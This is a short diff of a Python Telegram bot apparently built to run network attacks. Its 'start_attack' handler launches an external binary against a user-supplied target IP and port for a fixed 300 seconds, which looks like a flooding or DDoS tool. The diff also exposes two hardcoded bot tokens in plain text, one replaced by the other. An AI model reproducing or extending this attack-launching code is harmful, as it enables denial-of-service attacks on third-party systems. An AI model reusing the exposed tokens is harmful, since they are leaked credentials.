@@ -1,5 +1,5 @@
 # Bot token sabse upar declare kiya gaya hai
-TOKEN = "7879783137:AAHGoGK14RKtKI0nEFmvA9WRtrGz3aoVt9s"
+TOKEN = "8177191356:AAGXOAt0GlcIiM_0R1VfOOrjH1CgMPxmnig"
 
 import subprocess
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -60,6 +60,7 @@ async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.callback_query.message.reply_text("Attack is already running.")
         return
 
+    
     try:
         # Run the binary with target, port, and fixed time (300 seconds)
         process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
